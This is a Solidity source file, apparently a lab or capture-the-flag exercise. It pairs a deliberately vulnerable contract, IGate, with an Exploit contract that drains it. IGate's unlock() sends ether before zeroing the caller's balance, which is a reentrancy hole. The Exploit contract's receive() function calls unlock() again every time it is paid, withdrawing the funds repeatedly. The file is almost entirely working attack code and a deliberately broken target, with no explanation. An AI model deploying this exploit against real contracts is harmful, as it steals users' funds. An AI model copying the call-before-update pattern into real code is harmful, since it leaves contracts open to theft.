pragma solidity 0.8.19;

contract IGate {
    mapping(address => uint256) public balances;

    function lock() external payable {
        balances[msg.sender] += msg.value;
    }

    function unlock() external {
        uint256 amount = balances[msg.sender];
        msg.sender.call{value: amount}(""); 
        balances[msg.sender] = 0;
    }

    function locked() external view returns (bool) {
        if(address(this).balance >= 100 ether) {
            return true;
        }

        return false;
    }
}

contract Exploit {
    address target;
    IGate gate;
    constructor(address gateAddress) payable {
        target = gateAddress;
        gate = IGate(target);
    }

    function attack() external {
        gate.lock{value: 1 ether}();
        gate.unlock();
    }
    receive() external payable {
        gate.unlock();
    } 
}
